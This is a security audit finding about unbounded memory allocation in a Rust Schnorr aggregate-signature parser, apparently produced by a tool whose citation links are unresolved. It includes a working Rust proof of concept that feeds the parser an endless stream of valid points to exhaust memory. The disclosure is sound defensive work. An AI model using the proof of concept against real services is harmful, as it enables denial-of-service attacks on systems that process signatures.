### Title
Untrusted aggregate length causes unbounded inbound allocation before verification - (File: crypto/schnorr/src/aggregate.rs)

### Summary
`SchnorrAggregate::read` trusts an attacker-controlled 32-bit count and deserializes that many group elements without enforcing a protocol or caller-specified maximum. [1](#0-0)  The serialized count is not compared against the expected signature count until `verify`, after all attacker-supplied elements have already been decoded and stored. [2](#0-1) 

### Finding Description
The parser reads `len` directly from the input and executes `C::read_G(reader)` once for every declared element, pushing each result into `Rs`. [3](#0-2)  There is no bound on `len`, no comparison to the number of signatures being verified, and no limit on the amount read from the stream. [4](#0-3)  Verification only rejects a count mismatch afterward, when `self.Rs.len() != keys_and_challenges.len()`. [2](#0-1) 

If the lengths do match, `verify` additionally allocates a vector containing `2 * keys_and_challenges.len() + 1` multiplication pairs and performs variable-time multiexponentiation over the attacker-controlled transcript. [5](#0-4) 

### Impact Explanation
An unauthenticated party able to submit a serialized aggregate signature can cause memory consumption and decoding work proportional to the supplied aggregate before any semantic rejection occurs. A stream declaring up to `u32::MAX` elements can require billions of decoded group elements and vector entries, while a shorter but still oversized stream can exceed an application's intended aggregate-size limit before `verify` has an opportunity to reject it. [6](#0-5) 

### Likelihood Explanation
Serialized signatures and proof messages are normally received from counterparties before authentication can be completed. The vulnerable operation requires only control over the length field and enough following bytes containing valid group encodings; no private key, validator privilege, malformed curve input, or protocol violation beyond the oversized message is needed. [1](#0-0) 

### Recommendation
Pass the expected aggregate length, or an explicit maximum length, into `SchnorrAggregate::read` and reject `len > expected` before decoding any group elements. [1](#0-0)  For example, use an API such as `read(reader, expected_len)` or `read_limited(reader, max_len)`, and keep the existing equality check in `verify` as a second layer of validation. [2](#0-1) 

### Proof of Concept
The following reader repeatedly returns the canonical encoding of the Ristretto generator, causing `read` to attempt to store 4,294,967,295 group elements:

```rust
// crypto/schnorr/src/aggregate.rs
use std::io::{self, Read};
use ciphersuite::{group::{Group, GroupEncoding}, Ristretto};
use schnorr::SchnorrAggregate;

struct EndlessPoints {
  header: std::vec::IntoIter<u8>,
  point: <Ristretto as GroupEncoding>::Repr,
}

impl EndlessPoints {
  fn new() -> Self {
    Self {
      header: u32::MAX.to_le_bytes().to_vec().into_iter(),
      point: Ristretto::generator().to_bytes(),
    }
  }
}

impl Read for EndlessPoints {
  fn read(&mut self, mut out: &mut [u8]) -> io::Result<usize> {
    let original = out.len();

    while !out.is_empty() {
      if let Some(byte) = self.header.next() {
        out[0] = byte;
        out = &mut out[1 ..];
      } else {
        let amount = out.len().min(self.point.as_ref().len());
        out[.. amount].copy_from_slice(&self.point.as_ref()[.. amount]);
        out = &mut out[amount ..];
      }
    }

    Ok(original)
  }
}

// Consumes memory until the process is terminated or allocation fails.
let mut input = EndlessPoints::new();
let _ = SchnorrAggregate::<Ristretto>::read(&mut input);
```

The declared count is accepted without a bound, and each returned valid point is appended to `Rs` before verification can reject the aggregate. [6](#0-5)
